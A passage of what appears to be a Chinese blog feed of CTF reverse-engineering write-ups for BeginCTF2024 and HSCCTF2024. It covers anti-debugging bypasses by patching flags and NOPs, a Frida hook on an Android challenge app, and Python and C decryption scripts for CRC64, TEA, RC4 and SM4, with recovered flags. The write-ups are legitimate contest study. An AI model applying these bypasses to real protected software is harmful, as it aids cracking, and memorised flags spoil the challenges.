src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310180745-911708e0-4a7c-441c-8994-c2950867a4c2.png" class="" title="img"><p>密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310207895-f8791692-bf2a-40e0-8245-5eb5676ffff7.png" class="" title="img"><p>搜Buffer的引用就可以快速找到加密函数</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310683087-94b0f31b-b8bf-48f0-89e6-5bfcdcad3755.png" class="" title="img"><p>直接逆向，但是v2不知道</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311710013-96128072-d39b-432e-9457-08b664e82f66.png" class="" title="img"><p>直接下断点会有反调试，回到主函数，下断点判断反调试在一开始的地方</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311890774-ae42d0ee-d594-4b68-bf4c-ddf0632ad3ff.png" class="" title="img"><p>修改zf绕过</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311816831-261ccade-b998-4c91-b323-6032f9d92f27.png" class="" title="img"><p>发现下面还有一个，再次改zf</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311983982-1708e580-6d8e-4797-a38a-be068c139ce2.png" class="" title="img"><p>直接得到的key是不对的，因为还有时间反调试</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710312577210-a68f4a5f-7b37-43a7-908e-ab585aa1f299.png" class="" title="img"><p>nop掉然后apply,输入账号的时候记得输入群号612995005</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710315109337-d15b2b90-cd4a-4f5b-a800-02658cda1afd.png" class="" title="img"><p>交叉引用输入的字符串</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311347958-ca23a5f4-da8c-4f84-ac57-0e883451890f.png" class="" title="img"><p>先+5 ^0x25,然后传给比较的密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311364570-4da8a936-7595-4d84-89e7-884e6507b168.png" class="" title="img"><p>主要加密是一个魔改的crc64，通过和零比较，从而进行不同的加密，实际上是比较最高位</p><p>可以直接逆</p><p>高位溢出到了最低位，所以看密文最低位，根据最低位判断这个数在加密前最高位是1还是0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">key = <span class="hljs-number">0x33077d</span><br><br>def decrypt(value, key):<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">if</span> value &amp; <span class="hljs-number">1</span>:<br>            value = (value ^ key) &gt;&gt; <span class="hljs-number">1</span><br>            value |= <span class="hljs-number">0x8000000000000000</span>  #还原最高位<br>        <span class="hljs-keyword">else</span>:<br>            value = value &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> value<br><br>out = bytes.fromhex(<span class="hljs-string">&#x27;B4BBD8EBD06EABCA658E4BE94DD44AF37D29C2F99589A4859DCDDF77FD45CB5D7DFD934BBCF67CF32442F5D2DDE356AE&#x27;</span>)<br>out = [((i ^ <span class="hljs-number">0x25</span>) - <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> i in out]<br>print(out)<br><br>flag = b<span class="hljs-number">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>, len(out), <span class="hljs-number">8</span>):<br>    v = <span class="hljs-type">int</span>.from_bytes(out[i: i + <span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    flag += decrypt(v, key).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br>print(flag.decode())<br></code></pre></td></tr></table></figure><h2 id="goforfun-2"><a href="#goforfun-2" class="headerlink" title="goforfun-2"></a>goforfun-2</h2><p>和big库有关</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318523731-8f633811-dfcc-413f-989a-f197ff873f01.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318348426-6ef3ad5c-2474-447a-9de3-46ac29da1373.png" class="" title="img"><p>rc4部分很难辨别，同时key也找不到</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318429901-180e1f48-0226-4990-8feb-e4d16d39104c.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">big_int_to_byte_array</span><span class="hljs-params">(big_int)</span>:<br>    ans=[]<br>    <span class="hljs-keyword">while</span> big_int :<br>        ans.append(big_int&amp;<span class="hljs-number">0xff</span>)<br>        big_int&gt;&gt;=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> ans[::<span class="hljs-number">-1</span>]<br><br><br>cmpString = <span class="hljs-string">&quot;HZ0sMJXqxHgUb2b9RNg+1xw&quot;</span><br><br>str1 = <span class="hljs-string">&quot;8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT&quot;</span><br><br>cmpString = <span class="hljs-built_in">list</span>(cmpString)<br><br>str1 = <span class="hljs-built_in">list</span>(str1)<br><br>tmp=[]<br><br><span class="hljs-keyword">for</span> i in cmpString:<br>    tmp.append(str1.index(i))<br><br>print(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>print(tmp)<br><br>bignum = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i in range(len(tmp)<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>):<br>    bignum = bignum*<span class="hljs-number">0x40</span> + tmp[i]<br><br><span class="hljs-meta">#print(<span class="hljs-string">&#x27;bignum:&#x27;</span>)</span><br><span class="hljs-meta">#print((bignum))</span><br><br>bytea = big_int_to_byte_array(bignum)<br><br><span class="hljs-meta">#print(bytea)</span><br><br>def rc4_crypt(key, data):<br>    S = <span class="hljs-built_in">list</span>(range(<span class="hljs-number">255</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    # 初始化S盒<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + ord(key[i % len(key)]) ) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    # 生成密钥流并加解密<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-type">char</span> in data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(((<span class="hljs-type">char</span>) ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>]^<span class="hljs-number">0x2f</span>))<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>key1=<span class="hljs-string">&#x27;happynewyear&#x27;</span><br><br>key1 = <span class="hljs-built_in">list</span>(key1)<br><br>flag=rc4_crypt(key1,bytea)<br><span class="hljs-keyword">for</span> i in flag:<br>    print(chr(i),end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HSCCTF2024</title>
    <link href="/2024/03/10/HSCCTF2024/"/>
    <url>/2024/03/10/HSCCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hello-hscctf"><a href="#hello-hscctf" class="headerlink" title="hello-hscctf"></a>hello-hscctf</h2><p>从图片中提取关键信息</p><img src="/2024/03/10/HSCCTF2024/1709965570558-80b04d90-c33f-4182-a596-1fc0d1c32809.png" class="" title="img"><p>(03338) 76 Friseur Kosmetik Montag，点最后一个</p><img src="/2024/03/10/HSCCTF2024/1709965436900-11ae5ee9-924f-4600-ba89-9405fc614a7d.png" class="" title="img"><p>报纸左下角，搜Friseursalon Aerts</p><img src="/2024/03/10/HSCCTF2024/1709965629705-cf6b6322-fd1e-4e6f-846b-6f8265b578d6.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965400607-02188237-d602-462f-83ce-16783c0c243f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965382282-d5912365-6756-4b76-a271-5435c9507387.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>经典tea，密文呈现形式不同</p><img src="/2024/03/10/HSCCTF2024/1709961606736-8a0ceb3b-ea31-492f-8fad-249437667224.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><br><span class="hljs-built_in">int</span> main() &#123;<br>uint32_t v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>uint32_t delta = <span class="hljs-number">0x61C88647</span>;<br>uint32_t v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], <span class="hljs-built_in">sum</span> = -<span class="hljs-number">32</span> * delta, i; /* <span class="hljs-built_in">set</span> up */<br><br>uint32_t v2[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span>&#125;, v3[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span>&#125;, v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0xb805d767</span>, <span class="hljs-number">0x63c174c3</span>&#125;; //<span class="hljs-number">0x67</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0xb8</span><br>unsigned <span class="hljs-built_in">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>uint32_t k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>// v为要加密的数据是两个<span class="hljs-number">32</span>位无符号整数<br>// k为加密解密密钥，为<span class="hljs-number">4</span>个<span class="hljs-number">32</span>位无符号整数，即密钥长度为<span class="hljs-number">128</span>位<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">2</span>; m += <span class="hljs-number">2</span>) &#123;//flag不全的话有可能是<span class="hljs-number">10</span><br>//<span class="hljs-built_in">sum</span> = -<span class="hljs-number">957401312</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     /* basic cycle start */<br>v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + <span class="hljs-built_in">sum</span>) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + <span class="hljs-built_in">sum</span>) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><span class="hljs-built_in">sum</span> += delta;<br>&#125;                                              /* end cycle */<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br>printf(<span class="hljs-string">&quot;%x &quot;</span>, v5[i]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>//printf(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/03/10/HSCCTF2024/1709961543764-2858e782-886c-4814-a0aa-e5deb5787d5a.png" class="" title="img"><p>谁懂啊，exe输入错误，但是直接交是对的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">688</span>ed036-a86a60ce&#125;<br></code></pre></td></tr></table></figure><h2 id="no-py"><a href="#no-py" class="headerlink" title="no_py"></a>no_py</h2><p>pyc反编译效果不好</p><img src="/2024/03/10/HSCCTF2024/1709966236128-15b77610-7093-4097-be67-f0c51fd89e1d.png" class="" title="img"><p>用在线工具后发现key和enc在其他文件中，感觉和beginCTF的ezpython一模一样</p><img src="/2024/03/10/HSCCTF2024/1709966361759-cd04823d-7b18-46fe-92de-685d0ab82524.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709966965760-a8512425-228e-4aec-a16b-50247053893f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967326961-01a13c08-39ea-41d0-a149-0b09f1ba2bbb.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967524943-3a4e06c9-246e-417a-858c-f7bcaf4e2598.png" class="" title="img"><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><p>基本玩不出的游戏</p><img src="/2024/03/10/HSCCTF2024/1710038562295-31b684f0-b508-4741-9a19-c167db74bd2d.png" class="" title="img"><p>通过算法识别找到blowfish</p><img src="/2024/03/10/HSCCTF2024/1710038776255-a545b936-9122-410b-83f6-e73861058139.png" class="" title="img"><p>7.5的汉化效果好</p><img src="/2024/03/10/HSCCTF2024/1710039007125-ad52680c-29fa-464a-9830-25e876189981.png" class="" title="img"><p>后来按题目的思路走，修改程序一次完成，应该是自解密，不用解程序会帮我解</p><img src="/2024/03/10/HSCCTF2024/1710041102825-dbd65880-e0c1-42f9-aecf-21f84b4f1807.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">HSCCTF</span><span class="hljs-template-variable">&#123;H31L0_My_FR13ND!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="the-wolf-song"><a href="#the-wolf-song" class="headerlink" title="the_wolf_song"></a>the_wolf_song</h2><p>能识别但用不上</p><img src="/2024/03/10/HSCCTF2024/1710042320322-4ed576c7-5a94-4cb2-bf45-50ffa76d82a9.png" class="" title="img"><p>调试过掉前面的音乐</p><img src="/2024/03/10/HSCCTF2024/1710054119801-e25294b2-b516-4e4a-873c-b812f5d83c02.png" class="" title="img"><p>rc4算法，第一个内存会被初始化</p><img src="/2024/03/10/HSCCTF2024/1710054235494-d36be0da-eac4-4265-9a1c-75e7b59a40fc.png" class="" title="img"><p>流程在代码的第一行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#^6 -&gt; ^3 -&gt; rc4:HSCCTF&#123;FAKE_FLAG!&#125; -&gt; ^j -&gt; ^fake_flag[i] ^fake_flag[i+1] -&gt; ^j</span><br>fake_flag=<span class="hljs-string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span><br>enc=[<span class="hljs-number">0xce</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0x68</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(enc))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)-<span class="hljs-number">1</span>):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i+<span class="hljs-number">1</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i])<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><br>key=<span class="hljs-built_in">bytes</span>(fake_flag.encode())<br>decrypted = rc4(enc, key)<br><span class="hljs-comment">#print(decrypted)</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>    flag+=<span class="hljs-built_in">chr</span>(decrypted[i]^<span class="hljs-number">3</span>^<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br>HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;<br></code></pre></td></tr></table></figure><h2 id="Android-1"><a href="#Android-1" class="headerlink" title="Android-1"></a>Android-1</h2><p>复现来自yuro✌</p><img src="/2024/03/10/HSCCTF2024/1710057980233-dcb6dd18-2c42-474d-90c4-def9b46433e5-17102079978971.png" class="" title="img"><p>找到关键函数，murmur3_32 哈希算法，得到一个 32 字节的哈希，作为 key  </p><img src="/2024/03/10/HSCCTF2024/1710058239980-9f7b6594-99ca-4cf5-a0f6-aef795cbbdb7-17102079978983.png" class="" title="img"><p>sm4竟然插件没识别出来？看常数就可以发现</p><img src="/2024/03/10/HSCCTF2024/1710058389286-a856058d-c969-42f7-9b0d-228886c4e399-17102079978985.png" class="" title="img"><p>同一插件ida7.7就能识别</p><img src="/2024/03/10/HSCCTF2024/1710161320739-5f24379d-4131-48ff-8bf3-15d19f64e002.png" class="" title="img"><p>hook _Z10murmur3_32PKcjj函数 得到返回值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> func_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libmidand.so&quot;</span> , <span class="hljs-string">&quot;_Z10murmur3_32PKcjj&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;func addr is ---&quot;</span> + func_addr);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br>  <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;enter murmur3_32 retvalue-&gt;\n&quot;</span> + <span class="hljs-title function_">hexdump</span>(args));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>我用的是雷电模拟器，前置步骤网上有，也可以看这个</p><p><a href="https://www.yuque.com/u34082223/swqzq3/zdpepl9de1zwz7mw">https://www.yuque.com/u34082223/swqzq3/zdpepl9de1zwz7mw</a></p><p>运行远程frida-server后用<code>frida -U -l 1.js -f MidAnd</code>，一开始找不到MidAnd，用findstr才行</p><img src="/2024/03/10/HSCCTF2024/1710207312322-fcd1a619-46be-447b-a865-602cad21ca7f.png" class="" title="img"><p>一开始一直报错</p><img src="/2024/03/10/HSCCTF2024/1710166946004-61d68afc-f771-4451-b35c-f5215bb59651.png" class="" title="img"><p>在模拟器上输入字符然后点login就好了</p><img src="/2024/03/10/HSCCTF2024/1710207589439-8766b8f9-5ba4-4f91-b2fe-7c9992241683.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1710166891275-3b1302ac-022b-4296-b8c7-b9fdff543fea.png" class="" title="img"><p>再用SM4解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;731E133EF76A5CD1EF9626A9947CF4A46CE237B70D4905E921E35E2E7D7A1A74&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">               0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="hljs-string">7f13c97b0d00  c4 83 84 72 b8 e1 60 ba 5d 99 5a 6b e3 67 40 17  ...r..`.].Zk.g@.</span><br><span class="hljs-string">7f13c97b0d10  7c 3f 33 21 91 1c fa 54 8f 35 30 73 dd 2b 80 a7  |?3!...T.50s.+..</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>key1 = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;c4838472b8e160ba5d995a6be3674017&quot;</span>)<br>key2 = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;7c3f3321911cfa548f353073dd2b80a7&quot;</span>)<br><br>s = sm4.CryptSM4(padding_mode=sm4.zero_padding)<br><br>s.set_key(key1, sm4.SM4_DECRYPT) <br>dec = s.crypt_ecb(enc[:<span class="hljs-number">16</span>]) <br><span class="hljs-built_in">print</span>(dec.decode(), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>s.set_key(key2, sm4.SM4_DECRYPT) <br>dec = s.crypt_ecb(enc[<span class="hljs-number">16</span>:]) <br><span class="hljs-built_in">print</span>(dec.decode(), end=<span class="hljs-string">&quot;&quot;</span>)<br>flag&#123;fad1c7e27ec411eebe3a3e4419a1b3cc&#125;  <br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="funny"><a href="#funny" class="headerlink" title="funny"></a>funny</h2><img src="/2024/03/10/HSCCTF2024/1710041422186-08d964df-4990-493b-be7d-25c5069b4332.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IDA显示中文字符</title>
    <link href="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/"/>
    <url>/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/</url>
    
